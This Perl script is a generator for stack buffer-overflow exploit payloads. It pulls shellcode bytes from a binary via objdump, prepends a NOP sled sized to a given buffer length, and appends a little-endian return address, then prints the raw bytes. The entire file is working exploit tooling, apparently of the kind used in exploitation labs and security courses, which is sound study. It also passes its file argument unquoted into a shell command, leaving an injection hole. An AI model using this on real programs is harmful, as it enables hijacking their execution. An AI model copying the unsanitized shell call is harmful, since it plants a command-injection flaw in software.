#!/bin/perl

use strict;
use warnings;
use Getopt::Long;

use constant X86_64 => "X86_64";
use constant X86    => "X86";

# - Arguments ------------------------------------------------ #

my $pl;            # Payload
my $ip;            # Instruction pointer
my $bl;            # Buffer length
my $ma = X86_64;   # Machine architecture
my $le = 1;        # Little-endian ?

GetOptions (
    "pl=s" => \$pl,
    "ip=s" => \$ip,
    "bl=i" => \$bl,
    "ma=s" => \$ma,
    "le=i" => \$le,
) or die "Invalid arguments\n";

die "Missing payload\n"             unless defined $pl;
die "Missing instruction pointer\n" unless defined $ip;
die "Missing buffer length\n"       unless defined $bl;

# - Architecture --------------------------------------------- #

$ma = uc $ma;
my %ARCH_SIZE = (
    X86_64 => 8,
    X86    => 4,
);

die "Unsupported architecture: $ma\n"
    unless exists $ARCH_SIZE{$ma};

my $arch_size = $ARCH_SIZE{$ma};

# - Payload -------------------------------------------------- #

my $obj = `objdump -d $pl`;
die "objdump failed\n" if $? != 0;

my $hex_pl = "";

for my $line (split /\n/, $obj) {
    if ($line =~ /^\s*[0-9a-f]+:\s+((?:[0-9a-f]{2}\s)+)/) {
        for my $byte (split / /, $1) {
            $hex_pl .= $byte;
        }
    }
}
die "No opcode bytes found\n" unless length($hex_pl);

# - NOP Sled ------------------------------------------------- #

my $payload_len = length($hex_pl) / 2;
my $nop_sled_length = $bl + $arch_size - $payload_len;
die "Buffer is not large enough.\n" if ($nop_sled_length < 0);

my $nop_sled = "90" x $nop_sled_length;

# - Instruction pointer -------------------------------------- #

$ip =~ s/^0x//i;
die "Invalid instruction pointer: non-hex characters found\n"
    unless $ip =~ /^[0-9a-fA-F]+$/;

my $expected_len = ($arch_size == 8) ? 16 : 8;

$ip = lc $ip;
$ip = sprintf("%0${expected_len}s", $ip);

die "Invalid instruction pointer length after normalization\n"
    unless length($ip) == $expected_len;

if ($le) {
    my @bytes = ($ip =~ /../g);
    $ip = join("", reverse @bytes);
}

# - Convert to raw binary ------------------------------------ #

print pack("H*", $nop_sled . $hex_pl . $ip);
